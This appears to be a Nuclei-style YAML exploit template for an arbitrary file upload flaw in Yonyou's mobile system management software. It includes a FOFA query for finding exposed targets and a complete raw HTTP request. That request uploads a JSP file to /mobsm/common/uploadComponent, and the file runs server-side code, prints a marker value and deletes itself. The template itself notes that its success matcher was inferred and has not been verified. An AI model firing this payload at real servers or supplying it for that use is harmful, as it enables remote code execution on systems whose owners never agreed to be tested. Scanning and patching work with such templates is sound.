id: poc-661a697d5325674a5ef3
info:
  name: 用友移动系统管理uploadcomponent任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/661a697d5325674a5ef3dc03ee61f5e1

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 661a697d5325674a5ef3dc03ee61f5e1
    fofa: + fofa：`app="用友-移动系统管理"`
http:
- raw:
  - 'POST /mobsm/common/uploadComponent HTTP/1.1

    Content-Type: multipart/form-data; boundary=00content0boundary00

    User-Agent: Java/1.8.0_391

    Host: {{Hostname}}

    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

    Content-Length: 302

    Connection: close


    --00content0boundary00

    Content-Disposition: form-data; name="file"; filename="stc.jsp"


    <%out.print(111 * 111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    --00content0boundary00

    Content-Disposition: form-data; name="submit"


    上传

    --00content0boundary00--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
